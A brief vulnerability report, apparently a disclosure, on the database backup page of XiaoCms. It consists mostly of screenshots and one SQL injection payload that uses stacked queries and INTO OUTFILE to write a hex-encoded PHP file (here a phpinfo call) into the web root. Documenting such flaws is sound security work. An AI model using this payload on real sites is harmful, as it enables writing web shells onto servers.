Vulnerabilities in database backup page

![image-20190103165306686](assets/image-20190103165306686-6505586.png)

This function is located `XiaoCms\admin\controller\database.php`

![image-20190103170720605](assets/image-20190103170720605-6506440.png)

capture the packet，execute SQL command

![image-20190103170640434](assets/image-20190103170640434-6506400.png)

```mysql
`; select unhex('3C3F70687020706870696E666F28293B') INTO OUTFILE 'C:/phpStudy/PHPTutorial/WWW/xiaocms/she.php'; `;
```

![image-20190103170900567](assets/image-20190103170900567-6506540.png)

![image-20190103171146519](assets/image-20190103171146519-6506706.png)

![image-20190103171213687](assets/image-20190103171213687-6506733.png)

![image-20190103171234340](assets/image-20190103171234340-6506754.png)